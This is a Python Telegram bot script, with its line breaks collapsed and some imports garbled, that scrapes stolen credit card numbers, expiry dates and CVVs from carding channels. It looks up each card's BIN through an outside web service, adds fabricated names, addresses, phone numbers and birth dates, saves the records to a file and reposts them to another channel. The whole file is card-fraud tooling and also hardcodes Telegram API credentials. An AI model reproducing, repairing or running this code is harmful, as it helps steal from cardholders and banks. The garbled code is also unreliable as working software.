import telethonimport asyncioimportelethon import TelegramClient, eventsfrom random_address import real_random_addressimport namesfrom datetime import datetimeimport random from defs import getUrl, getcards, phoneAPI_ID = 11849455API_HASH = '0956032efc5694f60156fe65f9c19764'SEND_CHAT = '@scrappertb' client = TelegramClient('session', API_ID, API_HASH)ccs = [] chats = [ # '@fullcuentasgratis',' '@LalaScrap', '@ScrapperLost', '@DollyBinsChat', '@secretgroup01', '@CCsdiarioss', '@savagegroupoficial', '@RemChatChk', '@accerroreschecker', '@LigthStormChat', '@BlindScrap', '@kurumichks' ] with open('cards.txt', 'r') as r: temp_cards = r.read().splitlines() for x in temp_cards: car = getcards(x) if car: ccs.append(car[0]) else: continue @client.on(events.NewMessage(chats=chats, func = lambda x: getattr(x, 'text')))async def my_event_handler(m): if m.reply_markup: text = m.reply_markup.stringify() urls = getUrl(text) if not urls: return text = requests.get(urls[0]).text else: text = m.text cards = getcards(text) if not cards: return cc,mes,ano,cvv = cards if cc in ccs: return ccs.append(cc) bin = requests.get(f'https://adyen-enc-and-bin-info.herokuapp.com/bin/{cc[:6]}') if not bin: return bin_json = bin.json() addr = real_random_address() fullinfo = f"{cc}|{mes}|{ano}|{cvv}|{names.get_full_name()}|{addr['address1']}|{addr['city']}|{addr['state']}|{addr['postalCode']}|{phone()}|dob: {datetime.strftime(datetime(random.randint(1960, 2005), random.randint(1, 12),random.randint(1, 28), ), '%Y-%m-%d')}|United States Of America" text = f"""╔═══════════════════════╗╟ ● 𝑺𝒄𝒓𝒂𝒑𝒑𝒆𝒓 𝑪𝑪 「𝚃𝙱」 ╟═══════════════════════╝╟ [🝂] 𝗖𝗮𝗿𝗱 - ↯:╟ ╙ {cc}|{mes}|{ano}|{cvv}╟ [🝂] _𝗜𝗻𝗳𝗼 - ↯:╟ ╙ {bin_json['vendor']} - {bin_json['type']} - {bin_json['level']}╟ ╙ {bin_json['bank']}╟ ╙ {bin_json['country_iso']} - {bin_json['flag']}╟ [🝂] 𝙊𝙬𝙣𝙚𝙧𝙨 - ↯:@XerozSploitTae╚═══════════════════════╝""" print(f'{cc}|{mes}|{ano}|{cvv}') with open('cards.txt', 'a') as w: w.write(fullinfo + '\n') await client.send_message(SEND_CHAT, text, link_preview = False)
